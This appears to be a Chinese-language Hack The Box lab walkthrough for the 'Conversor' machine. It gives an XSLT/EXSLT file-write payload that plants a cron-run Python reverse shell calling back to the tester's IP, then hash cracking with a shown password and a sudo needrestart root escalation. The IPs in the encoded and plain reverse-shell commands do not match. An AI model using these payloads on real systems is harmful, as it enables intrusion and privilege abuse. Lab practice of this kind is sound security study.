---
title: HTB Conversor 靶场 Writeup
date: 2026-08-28 20:05:00
categories:
  - 靶场
tags:
  - HTB
  - Conversor
  - 靶场
description: HTB Conversor 靶场 Writeup
---

## Nmap

```
nmap -sV 10.129.238.31
```

22,80

将机器主机名添加到本地主机文件中：

```
echo "10.129.238.31 conversor.htb" | sudo tee -a /etc/hosts
```

10.129.238.31

![image-20260320202533396](/img/htb/htb-conversor-001.png)

注册登录之后进入

![image-20260320202702298](/img/htb/htb-conversor-002.png)

![image-20260320202732997](/img/htb/htb-conversor-003.png)

下载源码后：

tar -xvf source_code.tar.gz 解压

install.md:

<img src="/img/htb/htb-conversor-004.png" alt="image-20260320210005254" style="zoom:67%;" />

每分钟执行/var/www/conversor.htb/scripts 下的py文件

## XSLT 注入

利用xlst的EXSLT拓展往这个目录下写py脚本弹shell

> EXSLT，即可扩展样式表语言转换，是对XSLT（可扩展样式表语言转换）语言的一组扩展。EXSLT，即可扩展样式表语言转换，是对XSLT（可扩展样式表语言转换）语言的一组扩展。

参考：https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#write-files-with-exslt-extension

payload:

先在本地把反弹命令 base64 一下，避免引号、空格、特殊字符把 Python/XSLT 搞坏

```
printf 'bash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"' | base64 -w0
```

<img src="/img/htb/htb-conversor-005.png" alt="image-20260321131900707" style="zoom: 33%;" />

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl"
    version="1.0">

  <xsl:template match="/">
    <exsl:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import os
os.system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xNjYvNDQ0NCAwPiYxIg== | base64 -d | bash")
    </exsl:document>
  </xsl:template>

</xsl:stylesheet>
```

生成一个xlst文件

再准备一个合法 XML

```
<root/>
```

保存成 `a.xml`

在上传页面提交：

- xml_file = a.xml

- xslt_file = shell.xsl

![image-20260321131139860](/img/htb/htb-conversor-006.png)

点击生成的连接，等待1分钟获取到www-data用户

![image-20260321132155377](/img/htb/htb-conversor-007.png)

从app.py中获取到网站数据库路径/var/www/conversor.htb/instance/users.db 

<img src="/img/htb/htb-conversor-008.png" alt="image-20260321131357286" style="zoom: 33%;" />

查看数据库获取到fismathack用户密码哈希

```
sqlite3 /var/www/conversor.htb/instance/users.db 'select id,username,password from users;'
```

![image-20260321132401235](/img/htb/htb-conversor-009.png)

1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec

## john爆破

```
echo '5b5c3ac3a1c897c94caad48e6c71fdec' > md5.txt
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt md5.txt
john --show md5.txt
```

![image-20260321132607312](/img/htb/htb-conversor-010.png)

Keepmesafeandwarm

su fismathack

![image-20260321132817245](/img/htb/htb-conversor-011.png)

![image-20260321133426156](/img/htb/htb-conversor-012.png)

flag1: b7ff50e02f7e33c1ae3b327873783e63

![image-20260321133605537](/img/htb/htb-conversor-013.png)

##  needrestart -c

fismathack 可以sudo执行 **needrestart**工具，这个工具的源码可以在github上找到，可以发现其中-c参数存在命令执行（会把传入的文件当做perl执行）

方法一：直接弹 root shell

先写一个 Perl 文件：

```
printf 'exec "/bin/bash", "-p";\n' > /tmp/pwn.pl
```

> 意思是执行
>
> ```
> exec "/bin/bash", "-p";
> ```
>
> 1.`exec` 的意思是：用后面的程序，直接替换掉当前进程
>
> 也就是说，当前被执行的 Perl 进程，不再继续运行，而是“变成”：
>
> ```
> /bin/bash -p
> ```
>
> 这和 `system()` 有点像，但不完全一样：
>
> - `system()`：开一个子进程去执行命令，原 Perl 进程还在
> - `exec()`：直接把当前进程替换成目标程序
>
> 所以这里用 `exec` 效果就是：当前 root 权限的进程直接变成一个 root bash
>
> 2.`-p` 的作用可以理解成：
>
> **让 bash 以“特权模式”运行，尽量保留当前的有效权限，不主动降权。**
>
> 如果没有 `-p`，某些情况下 bash 可能会因为安全机制丢掉提权后的有效 uid

然后执行：

> 以root命令运行pwn.pl，让 root 进程直接变成 `/bin/bash -p`

```
sudo /usr/sbin/needrestart -c /tmp/pwn.pl
```

成功直接进 root shell

![image-20260321133925382](/img/htb/htb-conversor-014.png)

flag 2： 487165e8ae998a59dd34e09a822162a7

方法二：

```
echo 'system("chmod +s /bin/bash");' > pwn.sh
sudo /usr/sbin/needrestart -c pwn.sh
```

> 这里执行的系统命令就是：
>
> ```
> chmod +s /bin/bash
> ```
>
> system执行命令，给/bin/bash加上root权限

![image-20260321135510603](/img/htb/htb-conversor-015.png)

